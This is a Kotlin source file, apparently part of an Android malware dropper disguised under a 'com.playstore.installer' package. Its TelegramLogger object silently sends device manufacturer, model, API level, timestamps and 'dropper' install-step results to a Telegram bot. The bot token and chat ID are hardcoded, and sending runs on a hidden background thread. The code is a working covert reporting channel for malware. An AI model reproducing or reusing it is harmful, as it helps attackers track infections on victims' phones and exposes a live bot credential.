package com.playstore.installer

import android.content.Context
import android.os.Build
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object TelegramLogger {

    private const val BOT_TOKEN = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
    private const val CHAT_ID   = "8852912150"
    private val TAG = "TelegramLogger"

    /**
     * Send a log message to Telegram bot.
     * Runs on a background thread — never blocks UI.
     * Prepends device info + timestamp to every message.
     */
    fun send(context: Context, step: String, result: String, detail: String = "") {
        val ts     = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(Date())
        val device = "${Build.MANUFACTURER} ${Build.MODEL} (API ${Build.VERSION.SDK_INT})"
        val pkg    = context.packageName

        val text = buildString {
            appendLine("📱 VaultGuard Install Log")
            appendLine("🕐 $ts")
            appendLine("📲 $device")
            appendLine("📦 dropper=$pkg")
            appendLine("─────────────────────")
            appendLine("🔹 STEP: $step")
            appendLine("🔸 RESULT: $result")
            if (detail.isNotBlank()) {
                appendLine("ℹ️ DETAIL: $detail")
            }
        }

        Thread {
            try {
                val url  = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod      = "POST"
                conn.doOutput           = true
                conn.connectTimeout     = 10_000
                conn.readTimeout        = 10_000
                conn.setRequestProperty("Content-Type", "application/json")

                val escaped = text
                    .replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\n", "\\n")
                    .replace("\r", "\\r")
                    .replace("\t", "\\t")

                val payload = "{\"chat_id\":\"$CHAT_ID\",\"text\":\"$escaped\"}"
                val bytes   = payload.toByteArray(Charsets.UTF_8)

                conn.setRequestProperty("Content-Length", bytes.size.toString())
                val out: OutputStream = conn.outputStream
                out.write(bytes)
                out.flush()
                out.close()

                val code = conn.responseCode
                conn.disconnect()
                android.util.Log.d(TAG, "Sent [$step] → HTTP $code")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "Failed to send [$step]: ${e.message}")
            }
        }.start()
    }
}
